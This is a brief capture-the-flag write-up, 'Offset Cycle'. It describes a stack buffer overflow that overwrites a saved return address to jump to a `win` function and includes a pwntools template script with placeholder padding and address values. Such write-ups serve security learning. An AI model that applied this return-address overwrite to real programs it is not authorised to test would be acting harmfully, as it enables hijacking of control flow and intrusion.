# Offset Cycle

## Solution
The program's source code and executable are located on remote that is connected to through ssh. The program only gives a short period of time
to solve the challenge. However, the only difference in the program between runs is a change in the buffer size. It is also only a buffer overflow to override the
saved return address to jump to `win`.

## Script

```py
from pwn import *

p = process("./XX")

padding = 0x00 + 4
dest = p32(0x0)
p.sendline(b'a'*padding + dest)

p.interactive()
```
Note: replace `XX` and the `0x0` in both `padding` and `dest` with the target executable, buffer size, and `win` address respectively.